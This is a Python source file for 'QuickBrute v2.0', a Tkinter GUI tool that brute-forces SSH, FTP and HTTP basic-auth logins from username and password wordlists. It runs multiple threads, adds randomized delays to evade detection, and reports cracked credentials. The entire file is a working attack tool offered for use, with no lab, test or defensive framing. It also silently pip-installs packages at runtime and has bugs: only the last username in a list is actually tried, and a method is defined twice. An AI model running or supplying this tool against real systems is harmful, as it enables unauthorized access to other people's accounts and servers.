import importlib
import tkinter as tk
from tkinter import filedialog, scrolledtext, ttk, messagebox
import os
import re
import time
import threading
import queue
import random  # For the adaptive delay

# Check for required libraries and install if missing
def check_and_install_library(library_name, pip_name=None):
    if pip_name is None:
        pip_name = library_name
    try:
        importlib.import_module(library_name)
        return True
    except ImportError:
        try:
            import subprocess
            subprocess.check_call(['pip', 'install', pip_name])
            return True
        except Exception as e:
            print(f"Error: Could not install {library_name}. Please install it manually. Error Details: {e}")
            return False

# Check for required libraries
required_libraries = [
    ('paramiko', 'paramiko'),
    ('ftplib', 'ftplib'),  # ftplib is in standard library, no need to pip install
    ('requests', 'requests'),
    ('threading', 'threading'), # these are also standard libraries
    ('queue', 'queue'),
    ('tkinter', 'tkinter'),
    ('os', 'os'),
    ('re', 're'),
    ('time', 'time')
]

missing_libraries = []
for lib, pip_name in required_libraries:
    if not check_and_install_library(lib, pip_name):
        missing_libraries.append(lib)

if missing_libraries:
    error_message = "Missing the following libraries. Please install them manually, or try running the application from the command line (python your_script_name.py):\n" + "\n".join(missing_libraries)
    print(error_message)
    # Since the program can't run without these libraries, we exit.  The user can install them and run again.
    exit()

import paramiko
import ftplib
import requests
import threading
import queue
#import tkinter as tk # Already imported above
#from tkinter import filedialog, scrolledtext, ttk, messagebox # Already imported above
#import os # Already imported above
#import re # Already imported above
#import time # Already imported above
import random  # Already imported above

# Thread-safe queues
task_queue = queue.Queue()
log_queue = queue.Queue()

# --- Service brute force functions ---
def ssh_login(ip, username, password, stop_event, auth_method='password'):
    if stop_event.is_set():
        return False
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if auth_method == 'password':
            client.connect(ip, username=username, password=password, timeout=3)
        elif auth_method == 'publickey':
            # In a real-world scenario, you would load the private key from a file
            # For this example, we'll skip public key authentication
            log_queue.put(f"[-] \033[38;5;196mSSH Public Key Authentication not implemented: {username}@{ip}\033[0m")
            return False
        elif auth_method == 'gssapi-with-mic':
            try:
                import gssapi
                client.connect(ip, username=username, password=password,
                                gss_auth=True, gss_kex=True, timeout=3)
            except ImportError:
                log_queue.put(f"[-] \033[38;5;196mGSSAPI is not available: {username}@{ip}\033[0m")
                return False
            except Exception as e:
                log_queue.put(f"[-] \033[38;5;196mGSSAPI Authentication Error: {username}@{ip}: {e}\033[0m")
                return False
        client.close()
        return True
    except paramiko.AuthenticationException:
        log_queue.put(f"[-] \033[38;5;196mSSH Authentication Failed ({auth_method}): {username}:{password}@{ip}\033[0m")
        return False
    except paramiko.SSHException as e:
        log_queue.put(f"[-] \033[38;5;196mSSH Error on {ip}: {e}\033[0m")
        return False
    except Exception as e:
        log_queue.put(f"[-] \033[38;5;196mGeneral SSH Error on {ip}: {e}\033[0m")
        return False

def ftp_login(ip, username, password, stop_event):
    if stop_event.is_set():
        return False
    try:
        ftp = ftplib.FTP(ip, timeout=5)
        ftp.login(user=username, passwd=password)
        ftp.quit()
        return True
    except ftplib.error_perm as e:
        log_queue.put(f"[-] \033[38;5;196mFTP Authentication Failed: {username}:{password}@{ip} - {e}\033[0m")
        return False
    except Exception as e:
        log_queue.put(f"[-] \033[38;5;196mFTP Error on {ip}: {e}\033[0m")
        return False

def http_basic_auth_login(url, username, password, stop_event):
    if stop_event.is_set():
        return False
    try:
        response = requests.get(url, auth=(username, password), timeout=5)
        if response.status_code == 200:
            return True
        else:
            log_queue.put(f"[-] \033[38;5;196mHTTP Authentication Failed: {username}:{password}@{url} - Status Code: {response.status_code}\033[0m")
            return False
    except requests.exceptions.RequestException as e:
        log_queue.put(f"[-] \033[38;5;196mHTTP Error on {url}: {e}\033[0m")
        return False
    except Exception as e:
        log_queue.put(f"[-] \033[38;5;196mGeneral HTTP Error on {url}: {e}\033[0m")
        return False

# --- Worker thread ---
def worker(protocol, target, url, stop_event, ssh_auth_method='password'):
    while not task_queue.empty() and not stop_event.is_set():
        try:
            password = task_queue.get_nowait()
        except queue.Empty:
            return

        success = False
        try:
            if protocol == "ssh":
                success = ssh_login(target, username, password, stop_event, ssh_auth_method)
            elif protocol == "ftp":
                success = ftp_login(target, username, password, stop_event)
            elif protocol == "http":
                success = http_basic_auth_login(url, username, password, stop_event)
        except Exception as e:
            log_queue.put(f"[-] \033[38;5;196mError: {str(e)}\033[0m")  # Darker red

        if success:
            log_queue.put(f"[+] \033[38;5;46mSUCCESS: {username}:{password}@{target if protocol != 'http' else url} (Method: {ssh_auth_method if protocol == 'ssh' else 'N/A'})\033[0m")  # Brighter green
            messagebox.showinfo("Success", f"Password found: {username}:{password}@{target if protocol != 'http' else url}")
            stop_event.set()
            task_queue.queue.clear()
            return
        else:
            log_queue.put(f"[-] \033[38;5;208mFailed: {username}:{password}@{target if protocol != 'http' else url} (Method: {ssh_auth_method if protocol == 'ssh' else 'N/A'})\033[0m")  # Orange
        time.sleep(random.uniform(0.1, 2.0))  # Adaptive delay, "AI-like"

# --- GUI Class ---
class BruteForceGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("QuickBrute v2.0 - khanshorif57")  # Banner name added to title
        self.root.geometry("800x600")
        self.style = ttk.Style()
        self.style.theme_use("clam")

        # Variables
        self.protocol = tk.StringVar(value="ssh")
        self.target = tk.StringVar()
        self.url = tk.StringVar()
        self.username = tk.StringVar()
        self.userlist = tk.StringVar()  # Added userlist variable
        self.passlist = tk.StringVar()
        self.threads = tk.IntVar(value=5)
        self.stop_event = threading.Event()
        self.running = False  # Track attack status
        self.username_mode = tk.IntVar(value=0) # 0: single username, 1: username list
        self.bg_colors = ["#f0f0f0", "#e0e0e0", "#d0d0d0", "#c0c0c0"]  # More subtle background colors
        self.color_index = 0
        self.ssh_auth_method = tk.StringVar(value='password') # Added for SSH auth method

        self.build_gui()
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
        self.root.after(2000, self.update_background_color)  # Start background color animation

    def build_gui(self):
        # Banner Label
        self.banner_label = ttk.Label(self.root, text="Brut_Army", font=("Arial", 24, "bold"), foreground="#4CAF50")
        self.banner_label.pack(pady=10)

        main_frame = ttk.Frame(self.root, padding=20)
        main_frame.pack(fill=tk.BOTH, expand=True)

        # Protocol Section
        protocol_frame = ttk.LabelFrame(main_frame, text=" Attack Settings ", padding=10)
        protocol_frame.grid(row=0, column=0, sticky="ew", pady=5)

        ttk.Label(protocol_frame, text="Protocol:").grid(row=0, column=0, padx=5)
        protocol_menu = ttk.Combobox(protocol_frame, textvariable=self.protocol,
                                            values=["ssh", "ftp", "http"], state="readonly", width=10)
        protocol_menu.grid(row=0, column=1, padx=5)
        protocol_menu.bind("<<ComboboxSelected>>", self.toggle_url_field)

        ttk.Label(protocol_frame, text="Target:").grid(row=0, column=2, padx=5)
        ttk.Entry(protocol_frame, textvariable=self.target, width=25).grid(row=0, column=3, padx=5)

        # SSH Auth Method (Added in Protocol Frame)
        self.ssh_auth_frame = ttk.Frame(protocol_frame)
        self.ssh_auth_frame.grid(row=1, column=0, columnspan=4, pady=5, sticky="ew")
        ttk.Label(self.ssh_auth_frame, text="SSH Auth Method:").grid(row=0, column=0, padx=5)
        ssh_auth_menu = ttk.Combobox(self.ssh_auth_frame, textvariable=self.ssh_auth_method,
                                            values=["password", "publickey", "gssapi-with-mic"], state="readonly", width=15)
        ssh_auth_menu.grid(row=0, column=1, padx=5)
        ssh_auth_menu.grid_remove()  # Hide by default, only show for SSH

        # Credentials Section
        cred_frame = ttk.LabelFrame(main_frame, text=" Credentials ", padding=10)
        cred_frame.grid(row=1, column=0, sticky="ew", pady=5)

        # Username Mode Selection
        ttk.Label(cred_frame, text="Username Mode:").grid(row=0, column=0, padx=5)
        username_mode_frame = ttk.Frame(cred_frame)
        username_mode_frame.grid(row=0, column=1, padx=5, columnspan=2)
        ttk.Radiobutton(username_mode_frame, text="Single", variable=self.username_mode, value=0,
                          command=self.toggle_username_entry).grid(row=0, column=0)
        ttk.Radiobutton(username_mode_frame, text="List", variable=self.username_mode, value=1,
                          command=self.toggle_username_entry).grid(row=0, column=1)

        self.username_entry = ttk.Entry(cred_frame, textvariable=self.username, width=25)
        self.username_entry.grid(row=1, column=1, padx=5)
        self.userlist_entry = ttk.Entry(cred_frame, textvariable=self.userlist, width=25)
        self.userlist_entry.grid(row=1, column=1, padx=5)
        self.userlist_entry.grid_remove()  # Hide initially

        ttk.Label(cred_frame, text="Password List:").grid(row=1, column=2, padx=5)
        ttk.Entry(cred_frame, textvariable=self.passlist, width=25).grid(row=1, column=3, padx=5)
        ttk.Button(cred_frame, text="Browse", command=self.browse_passlist, width=10).grid(row=1, column=4, padx=5)

        # URL Section (hidden by default)
        self.url_frame = ttk.LabelFrame(main_frame, text=" HTTP Settings ", padding=10)
        ttk.Label(self.url_frame, text="URL:").grid(row=0, column=0, padx=5)
        ttk.Entry(self.url_frame, textvariable=self.url, width=50).grid(row=0, column=1, padx=5)

        # Threads Section
        control_frame = ttk.Frame(main_frame)
        control_frame.grid(row=3, column=0, pady=10)

        ttk.Label(control_frame, text="Threads:").grid(row=0, column=0, padx=5)
        ttk.Spinbox(control_frame, from_=1, to=20, textvariable=self.threads, width=5).grid(row=0, column=1, padx=5)

        self.start_btn = ttk.Button(control_frame, text="Start Attack", command=self.start_attack)
        self.start_btn.grid(row=0, column=2, padx=10)
        self.stop_btn = ttk.Button(control_frame, text="Stop", command=self.stop_attack, state=tk.DISABLED)
        self.stop_btn.grid(row=0, column=3, padx=10)

        # Output Section
        output_frame = ttk.LabelFrame(main_frame, text=" Results ", padding=10)
        output_frame.grid(row=4, column=0, sticky="nsew", pady=5)

        self.output = scrolledtext.ScrolledText(output_frame, width=90, height=15)
        self.output.pack(fill=tk.BOTH, expand=True)
        self.output.config(state=tk.DISABLED)  # Start with disabled state

        # Configure grid weights
        main_frame.columnconfigure(0, weight=1)
        output_frame.columnconfigure(0, weight=1)

        self.root.after(100, self.process_log_queue)

    def toggle_url_field(self, event=None):
        if self.protocol.get() == "http":
            self.url_frame.grid(row=2, column=0, sticky="ew", pady=5)
            self.ssh_auth_frame.grid_remove()  # Hide SSH auth frame
        elif self.protocol.get() == "ssh":
            self.url_frame.grid_forget()
            self.ssh_auth_frame.grid() # Show SSH auth frame
        else:
            self.url_frame.grid_forget()
            self.ssh_auth_frame.grid_remove()
            

    def toggle_username_entry(self):
        if self.username_mode.get() == 0:  # Single username mode
            self.username_entry.grid()
            self.userlist_entry.grid_remove()
        else:  # Username list mode
            self.username_entry.grid_remove()
            self.userlist_entry.grid()

    def process_log_queue(self):
        while not log_queue.empty():
            msg = log_queue.get_nowait()
            self.output.config(state=tk.NORMAL)  # Enable editing
            self.output.insert(tk.END, msg + "\n")
            self.output.see(tk.END)
            self.output.config(state=tk.DISABLED)  # Disable editing
        self.root.after(100, self.process_log_queue)

    def validate_inputs(self):
        if self.username_mode.get() == 0 and not self.username.get():
            messagebox.showerror("Error", "Username is required!")
            return False
        elif self.username_mode.get() == 1 and not self.userlist.get():
            messagebox.showerror("Error", "Username list file is required!")
            return False

        if not self.passlist.get():
            messagebox.showerror("Error", "Password list file is required!")
            return False

        if self.protocol.get() == "http" and not self.url.get().startswith(("http://", "https://")):
            messagebox.showerror("Error", "Invalid URL format!")
            return False

        return True

    def start_attack(self):
        if not self.validate_inputs():
            return

        global username
        if self.username_mode.get() == 0:
            username = self.username.get()
            usernames = [username]  # Wrap single username in a list
        else:
            try:
                with open(self.userlist.get()) as f:
                    usernames = [line.strip() for line in f if line.strip()]
            except Exception as e:
                messagebox.showerror("Error", f"File error: {str(e)}")
                return

        try:
            with open(self.passlist.get()) as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            messagebox.showerror("Error", f"File error: {str(e)}")
            return

        self.output.config(state=tk.NORMAL) #enable
        self.output.delete(1.0, tk.END)
        self.output.config(state=tk.DISABLED) # disable

        self.stop_event.clear()
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.running = True # set running to true

        ssh_auth_method = self.ssh_auth_method.get() # get the selected auth method.

        for user in usernames:  # Iterate through usernames
            username = user # set the global username
            for pw in passwords:
                task_queue.put(pw)

        for _ in range(max(1, min(self.threads.get(), 20))):
            t = threading.Thread(target=worker, args=(
                self.protocol.get(),
                self.target.get(),
                self.url.get(),
                self.stop_event,
                ssh_auth_method # Pass the auth method to the worker
            ))
            t.daemon = True
            t.start()

    def stop_attack(self):
        if self.running: # check if running
            self.stop_event.set()
            self.start_btn.config(state=tk.NORMAL)
            self.stop_btn.config(state=tk.DISABLED)
            log_queue.put("[!] \033[38;5;220mAttack stopped by user\033[0m")  # Yellow
            self.running = False # set running to false

    def browse_passlist(self):
        path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if path:
            self.passlist.set(path)

    def browse_userlist(self): # added browse user list
        path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if path:
            self.userlist.set(path)

    def toggle_username_entry(self):
        if self.username_mode.get() == 0:  # Single username mode
            self.username_entry.grid()
            self.userlist_entry.grid_remove()
        else:  # Username list mode
            self.username_entry.grid_remove()
            self.userlist_entry.grid()

    def update_background_color(self):
        self.color_index = (self.color_index + 1) % len(self.bg_colors)
        self.root.configure(bg=self.bg_colors[self.color_index])
        self.root.after(2000, self.update_background_color)  # Continue animation

    def on_close(self):
        self.stop_attack()
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = BruteForceGUI(root)
    root.mainloop()

